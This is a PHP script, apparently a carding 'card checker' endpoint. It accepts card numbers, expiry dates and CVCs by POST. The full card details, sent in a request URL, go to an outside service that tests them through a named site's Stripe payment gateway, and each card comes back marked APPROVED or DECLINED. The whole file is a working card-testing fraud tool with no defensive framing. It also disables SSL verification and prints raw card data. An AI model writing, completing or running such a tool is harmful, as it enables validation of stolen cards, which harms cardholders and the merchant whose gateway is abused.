<?php

require_once __DIR__ . '/validkey.php';
validateApiKey();

header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // Prepare card details for API and display
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    
    // API endpoint configuration
    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc=$encoded_cc";

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
    }

    $status = strtoupper($result['status']);
    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message

    // Output based on status
    if ($status === "APPROVED") {
        return "APPROVED [$response_msg] $card_details";
    } elseif ($status === "DECLINED") {
        return "DECLINED [$response_msg] $card_details";
    } else {
        return "DECLINED [Unknown status: $status] $card_details";
    }
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

$card = $_POST['card'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
$card_number = preg_replace('/[^0-9]/', '', $card['number']);
$exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
$exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
$cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
$exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y'); // Last two digits of current year (e.g., 25 for 2025)
    $current_century = (int) (date('Y') - $current_year); // e.g., 2000 for 2025
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    echo "DECLINED [Invalid card number format]";
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
    echo "DECLINED [Invalid exp_year format after normalization]";
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    echo "DECLINED [Invalid CVC format]";
    exit;
}

// Validate logical expiry
$expiry_timestamp = strtotime("$exp_year-$exp_month-01");
$current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
    exit;
}

// Check single card
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
